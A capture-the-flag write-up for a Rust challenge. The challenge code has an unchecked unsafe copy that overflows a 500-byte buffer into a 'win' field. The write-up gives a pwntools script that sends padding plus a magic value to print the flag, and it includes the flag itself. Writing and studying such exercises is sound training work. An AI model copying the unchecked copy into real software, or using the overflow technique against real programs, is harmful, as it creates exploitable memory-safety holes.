# [Pwn] pwnable

## 📚 Overview

> *"rust is pwnable? not sure"*

## 💻 Source Code

We could overwrite the `win` variable by overflowing the buffer and insert the value needed to trigger `read_flag()` function.

```rs
use std::{io::{Write, stdin, stdout, BufRead}, process::exit};

#[repr(C)]
struct Pwnable {
    data: [u8; 500],
    win: u64
}

fn input(prompt: &str) -> Vec<u8> {
    print!("{}", prompt);
    stdout().flush().unwrap();
    let mut buffer = Vec::new();
    stdin().lock().read_until(b'\n', &mut buffer).unwrap();
    buffer
}

fn read_flag(){
    let flag = std::fs::read_to_string("flag.txt");
    match flag {
        Ok(flag) => println!("{}", flag),
        Err(_) => println!("flag not found")
    }
}
fn main() {
    println!("wat sud i do wit rust?");
    let buf: Vec<u8> = input("> ");
    let mut pwn = Pwnable {
        data: [0; 500],
        win: 0
    };
    unsafe { std::ptr::copy(buf.as_ptr(), pwn.data.as_mut_ptr(), buf.len()) }
    if pwn.win as usize == 0xdeadb19b00b5dead {
        read_flag();
        exit(0);
    } else {
        println!("nope");
        exit(1);
    }
}
```

## ⚙ Full Script

**Payload >** Fill in the memory spaces provided for `data` variable, add the padding bytes, and then insert the value in `win` variable.

```python
from pwn import *
elf = context.binary = ELF("./pwnable", checksec=False)

p = process('./pwnable')
# p = remote("IP_ADDR", PORT)

offset = 500 + 4
payload = b'A' * offset + p64(0xdeadb19b00b5dead)
p.sendlineafter(b"> ", payload)

response = p.recvall(timeout=1).strip()
print(response.decode())

# TCF2024{pagi_pagi_begini_main_ctf?_hoaam_tidur_pun_sodap_ni}

p.close()
```